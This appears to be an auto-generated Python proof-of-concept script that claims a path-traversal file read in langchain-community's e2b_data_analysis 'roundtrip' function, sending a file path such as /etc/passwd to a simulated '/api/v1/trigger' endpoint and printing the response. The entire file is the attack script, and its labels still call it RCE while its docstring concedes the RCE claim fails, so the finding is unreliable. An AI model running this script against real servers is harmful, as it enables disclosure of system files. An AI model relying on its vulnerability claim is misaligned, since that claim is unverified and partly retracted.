#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-002
# Sink: roundtrip
# Auto-generated — run with: python3 rce_sink_function_compile_called_roundtrip.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept for arbitrary file read (path traversal) via the roundtrip function
in langchain-community's e2b_data_analysis/unparse.py.

This PoC demonstrates that an attacker can read arbitrary files on the server by
controlling the 'filename' parameter passed to the public API entry point (simulated
as a web endpoint). The function opens and pretty-prints the file's contents as valid
Python source code (if parseable) or returns an error.

Note: The original finding claimed Remote Code Execution (RCE) via the compile sink,
but the use of `ast.PyCF_ONLY_AST` prevents code execution. This PoC instead proves
a different security issue: arbitrary file disclosure.

Usage:
    python poc_file_read.py [--target URL] [--file PATH]

Example:
    python poc_file_read.py --target http://vulnerable-server:8080 --file /etc/passwd
"""

import argparse
import requests
import sys

def main():
    parser = argparse.ArgumentParser(
        description="PoC for arbitrary file read in langchain-community roundtrip function"
    )
    parser.add_argument(
        "--target",
        default="http://localhost:8000",
        help="Base URL of the vulnerable service (default: http://localhost:8000)"
    )
    parser.add_argument(
        "--file",
        default="/etc/passwd",
        help="Path to the file to read (default: /etc/passwd)"
    )
    args = parser.parse_args()

    url = args.target.rstrip("/") + "/api/v1/trigger"
    # The endpoint expects a string parameter named 'untrusted_user_input'
    payload = {"untrusted_user_input": args.file}

    print(f"[*] Attempting to read file: {args.file}")
    print(f"[*] Sending POST request to {url}")

    try:
        resp = requests.post(
            url,
            json=payload,
            timeout=10
        )
        print(f"[*] HTTP Response Code: {resp.status_code}")
        if resp.status_code == 200:
            print("[+] Success! File contents (or unparsed AST shown below):")
            # The server returns the pretty-printed Python source; if the file is not valid Python,
            # it may return an error message. We print the raw response.
            print(resp.text)
        else:
            print(f"[!] Unexpected response: {resp.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[!] Connection error: Is the target server running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[!] Request timed out.")
        sys.exit(1)
    except Exception as e:
        print(f"[!] An error occurred: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
